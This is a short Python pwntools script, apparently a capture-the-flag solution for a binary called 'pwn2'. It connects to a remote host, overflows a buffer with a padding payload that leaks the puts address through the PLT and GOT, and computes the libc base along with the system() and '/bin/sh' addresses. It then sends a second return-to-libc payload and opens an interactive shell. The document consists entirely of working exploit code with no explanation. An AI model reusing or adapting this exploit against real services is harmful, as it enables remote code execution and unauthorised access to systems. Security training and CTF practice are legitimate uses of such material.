from pwn import *
 
elf = ELF('pwn2')
name = 'A'*250
occ = 'B' * 250
func_addr = 0x8048637
puts_offset = 0x05f140
system_offset = 0x03a940
binsh_offset = 0x15902b
payload_getaddr = 'P'*277 + p32(elf.plt['puts']) + p32(func_addr) +p32(elf.got['puts'])
 
 
p = remote('35.221.144.41',10002)
p.recv()
p.sendline(name)
p.recv()
p.sendline(occ)
p.recv()
p.sendline('Y')
p.sendline(payload_getaddr)
p.recvuntil('\n\n')
puts_addr = u32(p.recv(4))
success('puts_addr:'+hex(puts_addr))
libc_addr = puts_addr - puts_offset
system_addr = libc_addr + system_offset
binsh_addr = libc_addr + binsh_offset
payload_getshell = 'P'*277 + p32(system_addr) + p32(func_addr) + p32(binsh_addr)
p.recv()
p.sendline(name)
p.recv()
p.sendline(occ)
p.recv()
p.sendline('Y')
p.sendline(payload_getshell)
p.interactive()
